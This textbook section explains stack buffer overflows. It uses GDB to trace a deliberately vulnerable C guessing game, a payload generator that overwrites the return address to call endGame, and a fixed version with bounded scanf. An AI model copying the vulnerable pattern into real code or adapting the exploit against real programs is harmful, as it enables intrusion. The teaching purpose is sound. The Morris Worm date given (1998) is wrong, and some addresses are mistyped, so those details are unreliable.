

 







-   -  
        -  
        -  
        -   [8.3. Additional Arithmetic
            Instructions]()
        -   [8.4. Conditional Control and
            Loops]()
            -  
            -  
            -  
        -  
        -  
        -  
        -  
        -  
        -  
        -  





















## 8.10. Real World: Buffer Overflow 

The C language does not perform automatic array bounds checking.
Accessing memory outside of the bounds of an array is problematic and
often results in errors such as segmentation faults. However, a clever
attacker can inject malicious code that intentionally overruns the
boundary of an array (also known as a **buffer**) to force the program
to execute in an unintended manner. In the worst cases, the attacker can
run code that allows them to gain **root privilege**, or OS-level access
to the computer system. A piece of software that takes advantage of the
existence of a known buffer overrun error in a program is known as a
**buffer overflow exploit**.


In this section, we use GDB and assembly language to fully characterize
the mechanics of a buffer overflow exploit. Prior to reading this
chapter we encourage you to explore the chapter discussing [GDB for
inspecting assembly
code](../C3-C_debug/gdb_assembly.html#_debugging_assembly_code).



### 8.10.1. Famous Examples of Buffer Overflow 

Buffer overflow exploits emerged in the 1980s and remained a chief
scourge of the computing industry through the early parts of the 2000s.
While many modern operating systems have protections against the
simplest buffer overflow attacks, careless programming errors can still
leave modern programs wide open to attack. Buffer overflow exploits have
recently been discovered in Skype^1^, Android^2^, Google Chrome^3^, and
others.


Here are some notable historic examples of buffer overflow exploits.


::: dlist

The Morris Worm

:   The Morris Worm^4^ was released in 1998 on ARPANet from MIT (to hide
    that it was written by a student at Cornell) and exploited a buffer
    overrun vulnerability that existed in the Unix finger daemon
    (`fingerd`). In Linux and other Unix-like systems, a **daemon** is a
    type of process that continuously executes in the background,
    usually performing clean-up and monitoring tasks. The `fingerd`
    daemon returns a user-friendly report on a computer or person. Most
    crucially, the worm had a replication mechanism that caused it to be
    sent to the same computer multiple times, bogging down the system to
    an unusable state. Although the author claimed that the worm was
    meant as a harmless intellectual exercise, the replication mechanism
    enabled the worm to spread easily and made it difficult to remove.
    In future years, other worms would employ buffer overflow exploits
    to gain unauthorized access into systems. Notable examples include
    Code Red (2001), MS-SQLSlammer (2003), and W32/Blaster (2003).

AOL Chat Wars

:   David Auerbach^5^, a former Microsoft engineer, detailed his
    experience with a buffer overflow during his efforts to integrate
    Microsoft's Messenger Service (MMS) with AOL Instant Messenger in
    the late 1990s. Back then, AOL Instant Messenger (AIM) was *the*
    service to use if you wanted to instant message (or IM) friends and
    family. Microsoft tried to gain a foothold in this market by
    designing a feature in MMS that enabled MMS users to talk to their
    AIM \"buddies.\" Displeased, AOL patched their servers so that MMS
    could no longer connect to them. Microsoft engineers figured out a
    way for MMS clients to mimic the messages sent by AIM clients to AOL
    servers, making it difficult for AOL to distinguish between messages
    received by MMS and AIM. AOL responded by changing the way AIM sent
    messages, and MMS engineers duly changed their client's messages to
    once again match AIM's. This \"chat war\" continued until AOL
    started using a buffer overflow error *in their own client* to
    verify that sent messages came from AIM clients. Since MMS clients
    did not have the same vulnerability, the chat wars ended, with AOL
    as the victor.



### 8.10.2. A First Look: The Guessing Game 

To help you understand the mechanism of the buffer overflow attack, we
provide a 32-bit executable of a simple program that enables the user to
play a guessing game with the program. Download the `secret` executable
at [this link](_attachments/secret.tar.gz) and extract it using the
`tar` command:




    $ tar -xzvf secret.tar.gz


Below, we provide a copy of `main.c` ([main.c](_attachments/main.c)),
the main file associated with the executable:




```
#include <stdio.h>
#include <stdlib.h>
#include "other.h" //contains secret function definitions

/*prints out the You Win! message*/
void endGame(void) {
    printf("You win!\n");
    exit(0);
}

/*main function of the game*/
int main(void) {

    int guess, secret, len;
    char buf[12]; //buffer (12 bytes long)

    printf("Enter secret number:\n");
    scanf("%s", buf); //read guess from user input
    guess = atoi(buf); //convert to an integer

    secret = getSecretCode(); //call the getSecretCode() function

    //check to see if guess is correct
    if (guess == secret) {
        printf("You got it right!\n");
    }
    else {
        printf("You are so wrong!\n");
        return 1; //if incorrect, exit
    }

    printf("Enter the secret string to win:\n");
    scanf("%s", buf); //get secret string from user input

    guess = calculateValue(buf, strlen(buf)); //call calculateValue function

    //check to see if guess is correct
    if (guess != secret){
        printf("You lose!\n");
        return 2; //if guess is wrong, exit
    }

    /*if both the secret string and number are correct
    call endGame()*/
    endGame();

    return 0;
}
```


This game prompts the user to enter first a secret number and then a
secret string to win the guessing game. The header file `other.h`
contains the definition of the `getSecretCode` and `calculateValue`
functions, but it is unavailable to us. How then can a user beat the
program? Brute forcing the solution will take too long. One strategy is
to analyze the `secret` executable in GDB and step through the assembly
to reveal the secret number and string. The process of examining
assembly code to reveal knowledge of how it works is commonly referred
to as **reverse engineering**. Readers comfortable enough with GDB and
reading assembly should be able to use GDB to reverse engineer the
secret number and the secret string.


However, there is a different, sneakier way to win.



### 8.10.3. Taking a Closer Look (Under the C) 

The program contains a potential buffer overrun vulnerability at the
first call to `scanf`. To understand what is going on, let's inspect the
assembly code of the `main` function using GDB. Let's also place a
breakpoint at address 0x0804859f, which is the address of the
instruction immediately before the call to `scanf` (placing the
breakpoint at the address of `scanf` causes program execution to halt
*inside* the call to `scanf`, not in `main`).




       0x08048582 <+0>:     push   %ebp
       0x08048583 <+1>:     mov    %esp,%ebp
       0x08048588 <+6>:     sub    $0x38,%esp
       0x0804858b <+9>:     movl   $0x8048707,(%esp)
       0x08048592 <+16>:    call   0x8048390 <printf@plt>
       0x08048597 <+21>:    lea    0x1c(%esp),%eax
       0x0804859b <+25>:    mov    %eax,0x4(%esp)
    => 0x0804859f <+29>:    movl   $0x804871c,(%esp)
       0x080485a6 <+36>:    call   0x80483e0 <scanf@plt>


Figure 1 depicts the stack immediately before the call
to `scanf`.




![before](_images/beforeScanf.png)


Figure 1. The call stack immediately before the call to scanf


Prior to the call to `scanf`, the arguments for `scanf` are preloaded
onto the stack, with the first argument at the top of the stack, and the
second argument one address below. The `lea` instruction at location
`<main+21>` creates the reference for array `buf`.


Now, suppose that the user enters `12345678` at the prompt.
\[afterScanf\] illustrates what the stack looks like
immediately after the call to `scanf` completes.




![after](_images/afterScanf.png)


Figure 2. The call stack immediately after the call to scanf with input
12345678


Recall that the hex values for the ASCII encodings of the digits 0 to 9
are 0x30 to 0x39, and that each stack memory location is four bytes
long. The frame pointer is 56 bytes away from the stack pointer. Readers
tracing along can confirm the value of `%ebp` by using GDB to print its
value (`p $ebp`). In the example shown, the value of `%ebp` is
0xffffd428. The following command allows the reader to inspect the 64
bytes (in hex) below register `%esp`:




    (gdb) x /64bx $esp


This GDB command yields output that looks similar to the following:




    0xffffd3f0:     0x1c    0x87    0x04    0x08    0x0c    0xd4    0xff    0xff
    0xffffd3f8:     0x00    0xa0    0x04    0x08    0xb2    0x86    0x04    0x08
    0xffffd400:     0x01    0x00    0x00    0x00    0xc4    0xd4    0xff    0xff
    0xffffd408:     0xcc    0xd4    0xff    0xff    0x31    0x32    0x33    0x34
    0xffffd410:     0x35    0x36    0x37    0x38    0x00    0x80    0x00    0x00
    0xffffd418:     0x6b    0x86    0x04    0x08    0x00    0x80    0xfb    0xf7
    0xffffd420:     0x60    0x86    0x04    0x08    0x00    0x00    0x00    0x00
    0xffffd428:     0x00    0x00    0x00    0x00    0x43    0x5a    0xe1    0xf7


Each line represents two 32-bit words. So, the first line represents the
words at addresses 0xffffd3f0 and 0xffffd3f4. Looking at the top of the
stack, we can see the memory address associated with the string `"%s"`
(or 0x0804871c) followed by the address of `buf` (or 0xffffd40c). Note
that the address for `buf` is simply represented as 0x40c in the figures
in this section.



+-----------------------------------+-----------------------------------+
|                                   |                          |
|                                   | Multibyte values are stored in    |
|                                   | little-endian order               |
|                                   | :::                               |
|                                   |                                   |
|                                   | ::: paragraph                     |
|                                   | In the preceding assembly         |
|                                   | segment, the byte at address      |
|                                   | 0xfffffd3f0 is 0x1c, the byte at  |
|                                   | address 0xfffffd3f1 is 0x87, the  |
|                                   | byte at address 0xfffffd3f2 is    |
|                                   | 0x04, and the byte at address     |
|                                   | 0xfffffd3f3 is 0x08. However, the |
|                                   | 32-bit *value* (which corresponds |
|                                   | to the memory address of the      |
|                                   | string `"%s"`) at address         |
|                                   | 0xfffffd3f0 is in fact            |
|                                   | 0x0804871c. Remember that because |
|                                   | x86 is a [little                  |
|                                   | endian](../C4-Binary/byte_order   |
|                                   | .html#_integer_byte_order) |
|                                   | system, the bytes for multibyte   |
|                                   | values such as addresses are      |
|                                   | stored in reverse order.          |
|                                   | Similarly, the bytes              |
|                                   | corresponding to the address of   |
|                                   | array `buf` (0xffffd40c) are      |
|                                   | stored in reverse order at        |
|                                   | address 0xfffffd3f4.              |
|                                   | :::                               |
+-----------------------------------+-----------------------------------+


The bytes associated with address 0xffffd40c are located on the same
line as those associated with address 0xffffd408, and are the second
word on that line. Since the `buf` array is 12 bytes long, the elements
associated with `buf` span the 12 bytes from address 0xffffd40c to
0xffffd417. Inspecting the bytes at those addresses yields:




    0xffffd408:     0xcc    0xd4    0xff    0xff    0x31    0x32    0x33    0x34
    0xffffd410:     0x35    0x36    0x37    0x38    0x00    0x80    0x00    0x00


At these locations, we can clearly see the hex representation of the
input string 12345678. The null termination byte `\0` appears in the
leftmost byte location at address 0xffffd414. Recall that scanf
terminates all strings with a null byte.


Of course, 12345678 is not the secret number. Here is the output when we
try to run `secret` with input string 12345678:




    $ ./secret
    $ ./secret
    Enter secret number:
    12345678
    You are so wrong!
    $ echo $?
    1


The `echo $?` command prints out the return value of the last executed
command in the shell. In this case, the program returned 1, because the
secret number we entered is wrong. Recall that by convention, programs
return 0 when there are no errors. Our goal going forward is to trick
the program to exit with a return value of 0, indicating that we won the
game.



### 8.10.4. Buffer Overflow: First Attempt 

Next, let's try typing in the string
`1234567890123456789012345678901234`:




    $ ./secret
    Enter secret number:
    1234567890123456789012345678901234
    You are so wrong!
    Segmentation fault (core dumped)
    $ echo $?
    139


Interesting! Now the program crashes with a segmentation fault, with
return code 139. Figure 3 shows what the call stack
for `main` looks like immediately after the call to `scanf` with this
new input.




![after2](_images/afterScanf2.png)


Figure 3. The call stack immediately after the call to scanf with input
1234567890123456789012345678901234


The input string is so long that it not only overwrote the value stored
at address 0x428, but it spilled over into the return address below the
stack frame for `main`. Recall that when a function returns, the program
tries to resume execution at the address specified by the return
address. In this example, the program tries to resume execution at
address 0xf7003433 after exiting `main`, which does not exist. So the
program crashes with a segmentation fault.


Rerunning the program in GDB (`input.txt` contains the input string
above) reveals this devilry in action:




    $ gdb secret
    (gdb) break *0x804859b
    (gdb) ni
    (gdb) run < input.txt
    (gdb) x /64bx $esp
    0xffffd3f0:     0x1c    0x87    0x04    0x08    0x0c    0xd4    0xff    0xff
    0xffffd3f8:     0x00    0xa0    0x04    0x08    0xb2    0x86    0x04    0x08
    0xffffd400:     0x01    0x00    0x00    0x00    0xc4    0xd4    0xff    0xff
    0xffffd408:     0xcc    0xd4    0xff    0xff    0x31    0x32    0x33    0x34
    0xffffd410:     0x35    0x36    0x37    0x38    0x39    0x30    0x31    0x32
    0xffffd418:     0x33    0x34    0x35    0x36    0x37    0x38    0x39    0x30
    0xffffd420:     0x31    0x32    0x33    0x34    0x35    0x36    0x37    0x38
    0xffffd428:     0x39    0x30    0x31    0x32    0x33    0x34    0x00    0xf7


Notice that our input string blew past the stated limits of the array
`buf`, overwriting all the other values stored on the stack. In other
words, our string created a buffer overrun and corrupted the call stack,
causing the program to crash. This process is also known as **smashing
the stack**.



### 8.10.5. A Smarter Buffer Overflow: Second Attempt 

Our first example smashed the stack by overwriting the `%ebp` register
and return address with junk, causing the program to crash. An attacker
whose goal is to simply crash a program would be satisfied at this
point. However, our goal is to trick the guessing game to return 0,
indicating that we won the game. We accomplish this by filling the call
stack with data more meaningful than junk values. For example, we could
overwrite the stack so that the return address is replaced with the
address of `endGame`. Then, when the program attempts to return from
`main`, it will instead execute `endGame` rather than crashing with a
segmentation fault.


To find out the address of `endGame`, let's inspect `secret` again in
GDB:




    $ gdb secret
    (gdb) disas endGame
    Dump of assembler code for function endGame:
       0x08048564 <+0>:     push   %ebp
       0x08048565 <+1>:     mov    %esp,%ebp
       0x08048567 <+3>:     sub    $0x18,%esp
       0x0804856a <+6>:     movl   $0x80486fe,(%esp)
       0x08048571 <+13>:    call   0x8048390 <puts@plt>
       0x08048576 <+18>:    movl   $0x0,(%esp)
       0x0804857d <+25>:    call   0x80483b0 <exit@plt>
    End of assembler dump.


Observe that `endGame` starts at address 0x08048564. [Figure
4](#finalExploit32) illustrates a sample exploit that forces `secret` to
run the `endGame` function.




![exploit](_images/finalExploit.png)


Figure 4. A sample string that can force secret to execute the endGame
function


Again, since x86 is a [little
endian](../C4-Binary/byte_order.html#_integer_byte_order) system
in which the stack grows toward lower addresses, the bytes in the return
address appear to be in reverse order.


The following program illustrates how an attacker could construct the
preceding exploit:




```
#include <stdio.h>

char ebuff[]=
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x30" /*first 10 bytes of junk*/
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x30" /*next 10 bytes of junk*/
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x30" /*following 10 bytes of junk*/
"\x31\x32" /*last 2 bytes of junk*/
"\x64\x85\x04\x08" /*address of endGame (little endian)*/
;

int main(void) {
    int i;
    for (i = 0; i < sizeof(ebuff); i++) { /*print each character*/
        printf("%c", ebuff[i]);
    }
    return 0;
}
```


The `\x` before each number indicates that the number is formatted as
the hexadecimal representation of a character. After defining `ebuff[]`,
the `main` function simply prints it out, character by character. To get
the associated byte string, compile and run this program as follows:




    $ gcc -o genEx genEx.c
    $ ./genEx > exploit


To use the file `exploit` as input to `scanf` it suffices to run
`secret` with `exploit` as follows:




    $ ./secret < exploit
    Enter secret number:
    You are so wrong!
    You win!


The program prints out \"You are so wrong!\" because the string
contained in `exploit` is *not* the secret number. However, the program
also prints out the string \"You win!\" Recall, though, that our goal is
to trick the program to return 0. In a larger system, where the notion
of \"success\" is tracked by an external program, it is often most
important what a program returns, not what it prints out.


Checking the return value yields:




    $ echo $?
    0


Our exploit works! We won the game!



### 8.10.6. Protecting Against Buffer Overflow 

The example we showed changed the control flow of the `secret`
executable, forcing it to return a zero value associated with success.
However, an exploit like this could do some real damage. Furthermore,
some older computer systems *executed* bytes from stack memory. If an
attacker placed bytes associated with assembly instructions on the call
stack, the CPU would interpret the bytes as *real* instructions,
enabling the attacker to force the CPU to execute *any arbitrary code of
their choosing*. Fortunately, there are strategies that modern computer
systems employ to make it more difficult for attackers to run buffer
overflow exploits:



-   **Stack Randomization**: The OS allocates the starting address of
    the stack at a random location in stack memory, causing the
    position/size of the call stack to vary from one run of a program to
    another. Multiple machines running the same code would have
    different stack addresses. Modern Linux systems use stack
    randomization as a standard practice. However, a determined attacker
    can brute force the attack, by attempting to repeat attacks with
    different addresses. A common trick is to use a **NOP sled** (or
    slide), i.e., a large number of `nop` instructions, before the
    actual exploit code. Executing the `nop` instruction (`0x90`) has no
    effect, other than causing the program counter to increment to the
    next instruction. As long as the attacker can get the CPU to execute
    somewhere in the NOP sled, the NOP sled will eventually lead to the
    exploit code that follows it. Aleph One's writeup, *Smashing the
    Stack for Fun and Profit*^6^ details the mechanism of this type of
    attack.

-   **Stack corruption detection**: Another line of defense is to try to
    detect when the stack is corrupted. Recent versions of GCC use a
    stack protector known as a **canary** that acts as a guard between
    the buffer and the other elements of the stack. A canary is a value
    stored in a nonwriteable section of memory that can be compared to a
    value put on the stack. If the canary \"dies\" during a program's
    execution, the program knows that it is under attack and aborts with
    an error message. A clever attacker can, however, replace the canary
    to prevent the program from detecting stack corruption.

-   **Limiting executable regions**: In this line of defense, executable
    code is restricted to only particular regions of memory. In other
    words, the call stack is no longer executable. However, even this
    defense can be defeated. In an attack utilizing **return-oriented
    programming** (ROP), an attacker can \"cherry-pick\" instructions in
    executable regions and jump from instruction to instruction to build
    an exploit. There are some famous examples of this online,
    especially in video games^7^.


However, the best line of defense is always the programmer. To prevent
buffer overflow attacks on your programs, use C functions with **length
specifiers** whenever possible and add code that performs array bounds
checking. It is crucial that any defined arrays match the chosen length
specifiers. Table 1 lists some common \"bad\" C
functions that are vulnerable to buffer overflow and the corresponding
\"good\" function to use (assume that `buf` is allocated 12 bytes).


+-----------------------------------+-----------------------------------+
| Instead of:                       | Use:                              |
+===================================+===================================+
| `gets(buf)`                       | `fgets(buf, 12, stdin)`           |
+-----------------------------------+-----------------------------------+
| `scanf("%s", buf)`                | `scanf("%12s", buf)`              |
+-----------------------------------+-----------------------------------+
| `strcpy(buf2, buf)`               | `strncpy(buf2, buf, 12)`          |
+-----------------------------------+-----------------------------------+
| `strcat(buf2, buf)`               | `strncat(buf2, buf, 12)`          |
+-----------------------------------+-----------------------------------+
| `sprintf(buf, "%d", num)`         | `snprintf(buf, 12, "%d", num)`    |
+-----------------------------------+-----------------------------------+

: Table 1. C Functions with Length Specifiers

The `secret2` binary ([secret2.tar.gz](_attachments/secret2.tar.gz)) no
longer has the buffer overflow vulnerability. Here's the `main` function
of this new binary ([main2.c](_attachments/main2.c)):




```
#include <stdio.h>
#include <stdlib.h>
#include "other.h" //contain secret function definitions

/*prints out the You Win! message*/
void endGame(void) {
    printf("You win!\n");
    exit(0);
}

/*main function of the game*/
int main(void) {
    int guess, secret, len;
    char buf[12]; //buffer (12 bytes long)

    printf("Enter secret number:\n");
    scanf("%12s", buf); //read guess from user input (fixed!)
    guess = atoi(buf); //convert to an integer

    secret=getSecretCode(); //call the getSecretCode function

    //check to see if guess is correct
    if (guess == secret) {
        printf("You got it right!\n");
    }
    else {
        printf("You are so wrong!\n");
        return 1; //if incorrect, exit
    }

    printf("Enter the secret string to win:\n");
    scanf("%12s", buf); //get secret string from user input (fixed!)

    guess = calculateValue(buf, strlen(buf)); //call calculateValue function

    //check to see if guess is correct
    if (guess != secret) {
        printf("You lose!\n");
        return 2; //if guess is wrong, exit
    }

    /*if both the secret string and number are correct
    call endGame()*/
    endGame();

    return 0;
}
```


Notice that we added a length specifier to all calls of `scanf`, causing
the `scanf` function to stop reading from input after the first 12 bytes
are read. The exploit string no longer breaks the program:




    $ ./secret2 < exploit
    Enter secret number:
    You are so wrong!
    $ echo $?
    1


Of course, any reader with basic reverse-engineering skills can still
win the guessing game by analyzing the assembly code. If you haven't
tried to beat the program yet with reverse engineering, we encourage you
to do so now.


### References {#_references .discrete}


1.  Mohit Kumar. [Critical Skype Bug Lets Hackers Remotely Execute
    Malicious
    Code](https://thehackernews.com/2017/06/skype-crash-bug.html). 2017.

2.  Tamir Zahavi-Brunner. [CVE-2017-13253: Buffer overflow in multiple
    Android DRM
    services](https://blog.zimperium.com/cve-2017-13253-buffer-overflow-multiple-android-drm-services/).
    2018.

3.  Tom Spring. [Google Patches 'High Severity' Browser
    Bug](https://threatpost.com/google-patches-high-severity-browser-bug/128661/).
    2017.

4.  Christopher Kelty. [The Morris
    Worm](https://limn.it/articles/the-morris-worm/) Limn Magazine,
    Issue 1. Issue 1, Systemic Risk. 2011.

5.  David Auerbach. [Chat Wars: Microsoft vs.
    AOL](https://nplusonemag.com/issue-19/essays/chat-wars/) NplusOne
    Magazine, Issue 19. Spring 2014.

6.  Aleph One. [Smashing the Stack for Fun and
    Profit](http://insecure.org/stf/smashstack.html). 1996.

7.  DotsAreCool. [Super Mario World Credit
    Warp](https://youtu.be/vAHXK2wut_I) (Nintendo ROP example). 2015.






